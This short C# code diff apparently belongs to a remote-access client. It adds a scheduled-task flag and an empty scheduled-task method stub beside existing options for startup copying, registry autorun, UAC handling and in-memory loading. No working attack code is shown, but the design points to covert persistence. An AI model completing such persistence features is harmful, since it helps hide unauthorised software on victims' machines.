@@ -20,6 +20,7 @@ namespace winClient48
         public bool m_bCopyDir { get; set; }
         public bool m_bStartUp { get; set; }
         public bool m_bReg { get; set; }
+        public bool m_bScheduledTask { get; set; }
         public bool m_bUAC { get; set; }
         public bool m_bLoadToMemory { get; set; }
 
@@ -47,6 +48,8 @@ namespace winClient48
             {
                 RegRun();
             }
+
+
 
             if (m_bUAC)
                 UAC();
@@ -96,6 +99,11 @@ namespace winClient48
         public void RegRemove()
         {
             reg_key.DeleteValue(m_szRegKeyName);
+        }
+
+        public void fnCreateScheduledTask(string szTaskName, string szAuthor, string szTrigger, string szProgram, string szArgument, string szUser, string szStartTime, string szRemoteServer)
+        {
+            
         }
 
         /// <summary>
